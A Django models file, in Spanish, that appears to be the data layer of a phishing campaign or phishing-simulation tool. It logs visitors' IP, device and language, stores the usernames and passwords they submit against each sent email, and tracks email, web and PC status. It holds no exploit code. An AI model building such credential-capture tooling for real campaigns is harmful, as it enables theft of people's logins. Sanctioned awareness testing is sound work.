from django.db import models
from django.contrib.auth.models import User
from backend.smtp.models import Enviados
from django.db.models.signals import pre_delete
from django.dispatch import receiver

# Create your models here.

class Registro(models.Model):

    ip = models.GenericIPAddressField(blank=True, null=True)
    agente = models.TextField(blank=True, null=True)
    pais = models.CharField(max_length=100,blank=True, null=True)
    metodo = models.CharField(max_length=10,blank=True, null=True)
    parametros = models.TextField(blank=True, null=True)
    sistema_operativo = models.CharField(max_length=100,blank=True, null=True)
    dispositivo = models.CharField(max_length=100,blank=True, null=True)
    idioma = models.CharField(max_length=100, blank=True, null=True)
    fecha = models.DateTimeField(blank=True, null=True)

    def __str__(self):
        return str(self.id)

class Credenciales(models.Model):
    usuario = models.CharField(max_length=25)
    contraseña = models.CharField(max_length=25)
    enviado = models.ForeignKey(Enviados, on_delete=models.CASCADE)   

    def __str__(self):
        return str(self.id)


class Estatus_Mail(models.Model):

    enviado = models.ForeignKey(Enviados, on_delete=models.CASCADE)
    registro = models.ForeignKey(Registro, on_delete=models.CASCADE)

    def __str__(self):
        return f'LogEntry #{self.id}'

class Estatus_Web(models.Model):

    estatus = models.BooleanField(default=False)
    credenciales = models.ForeignKey(Credenciales, on_delete=models.CASCADE)
    enviado = models.ForeignKey(Enviados, on_delete=models.CASCADE)
    registro = models.ForeignKey(Registro, on_delete=models.CASCADE)

    def __str__(self):
        return f'LogEntry #{self.id}'
    
class Estatus_PC(models.Model):

    credenciales = models.ForeignKey(Credenciales, on_delete=models.CASCADE)
    estado_consola = models.BooleanField(default=False)
    enviado = models.ForeignKey(Enviados, on_delete=models.CASCADE)
    registro = models.ForeignKey(Registro, on_delete=models.CASCADE)

    def __str__(self):
        return f'LogEntry #{self.id}'
    
@receiver(pre_delete, sender=Estatus_Mail)
@receiver(pre_delete, sender=Estatus_Web)
@receiver(pre_delete, sender=Estatus_PC)
def eliminar_registro(sender, instance, **kwargs):
    registro = instance.registro
    registro.delete()